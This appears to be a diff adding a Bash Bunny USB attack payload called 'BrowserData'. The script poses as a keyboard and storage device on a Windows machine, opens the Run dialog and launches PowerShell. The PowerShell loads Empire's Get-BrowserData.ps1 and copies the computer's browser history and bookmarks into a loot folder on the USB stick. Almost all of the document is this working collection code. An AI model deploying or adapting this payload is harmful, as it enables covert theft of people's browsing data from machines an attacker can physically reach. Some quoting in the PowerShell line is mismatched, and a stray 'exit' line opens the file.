@@ -1,0 +1,37 @@
+exit
+#!/bin/bash
+#
+# Title:         BrowserData
+# Author:        zachstanford
+# Version:       0.1 (Tested on Windows 10)
+#
+# Dumps browser info like history and bookmarks from  powershell script 
+# then saves them in /root/udisk/loot/BrowserData/%ComputerName%
+# Credits to this Empire's powershell script:
+# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1
+
+#script 
+# Blue...............Running Script
+# Purple.............Finished
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED R 200
+LOOTDIR=/root/udisk/loot/BrowserData
+mkdir -p $LOOTDIR
+
+ATTACKMODE HID STORAGE
+LED B 200
+
+# wait 6 seconds for the storage to popup
+Q DELAY 6000
+Q GUI r
+Q DELAY 100
+RUN WIN powershell \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Get-BrowserData.ps1'); $bunny =(gwmi win32_volume -f ’label=‘’BashBunny’’' |  Select-Object -ExpandProperty DriveLetter); Get-BrowserInformation | Out-File -Append $bunny\loot\BrowserData\$env:computername.txt\"
+Q ENTER
+Q DELAY 2000
+Q STRING exit
+Q ENTER
+sync
+LED R B 200
